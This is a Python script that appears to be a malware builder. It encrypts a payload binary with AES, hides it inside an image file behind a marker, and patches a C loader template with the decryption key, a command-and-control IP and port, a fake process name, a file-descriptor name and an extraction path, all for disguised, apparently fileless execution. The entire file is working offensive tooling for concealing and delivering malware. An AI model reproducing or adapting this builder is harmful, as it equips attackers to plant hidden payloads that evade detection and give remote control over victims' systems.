import argparse
import os
import json
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)


def bytes_to_c_array(name, byte_array):
    return f"unsigned char {name}[{len(byte_array)}] = {{ {', '.join(str(b) for b in byte_array)} }};"


def main():
    parser = argparse.ArgumentParser(description="Embed encrypted binary into image and generate patched loader.")
    parser.add_argument("--config", required=True, help="Path to JSON config file")
    args = parser.parse_args()

    # Load config
    with open(args.config, "r") as f:
        config = json.load(f)

    image_path = config["image"]
    binary_path = config["payload"]
    password = config["password"]
    output_path = config.get("image_payload", "")
    loader_path = config.get("loader", "")
    patched_path = config.get("loader_build", "")
    
    # Patch loader
    with open(loader_path, "r") as f:
        loader_code = f.read()

    loader_code = loader_code.replace("{__KEY__}", '{' + ', '.join(['0'] * 32) + '}')
    loader_code = loader_code.replace("{__IV__}",  '{' + ', '.join(['0'] * 16) + '}')

    if image_path and binary_path:
        print(f"[*] Payload {binary_path} will be in the image {image_path}")
        if not password:
            print(f"[*] Non encrypted payload!")
        else:
            # Read files
            with open(image_path, "rb") as f:
                image_data = f.read()
            with open(binary_path, "rb") as f:
                binary_data = f.read()
    
            # Generate key and IV
            key = sha256(password.encode()).digest()  # 32 bytes
            iv = get_random_bytes(16)
    
            # Encrypt binary
            cipher = AES.new(key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(binary_data))
    
            # Append to image with marker
            with open(output_path, "wb") as f:
                f.write(image_data)
                f.write(config["MARKER"].encode())
                f.write(iv)
                f.write(encrypted)
            
            print(f"[*] Output image written to: {output_path}")
            
            key_c = bytes_to_c_array("key", key)
            iv_c = bytes_to_c_array("iv", iv)
    
            loader_code = loader_code.replace("__KEY__", ', '.join(str(b) for b in key))
            loader_code = loader_code.replace("__IV__", ', '.join(str(b) for b in iv))

    replacements = {
        "{__C2_IP__}": f'"{config["C2_IP"]}"',
        "{__C2_PORT__}": f'{config["C2_PORT"]}',
        "{__FAKE_PROC__}": f'"{config["FAKE_PROC"]}"',
        "{__FD_NAME__}": f'"{config["FD_NAME"]}"',
        "{__PROC_LINK__}": f'"{config["PROC_LINK"]}"',
        "{__EXTRACT_PATH__}": f'"{config["EXTRACT_PATH"]}"',
        "{__MARKER__}": f'"{config["MARKER"]}"',
    }
    for k, v in replacements.items():
        loader_code = loader_code.replace(k, v)
        with open(patched_path, "w") as f:
            f.write(loader_code)

    print(f"[*] Patched loader written to: {patched_path}")

if __name__ == "__main__":
    main()
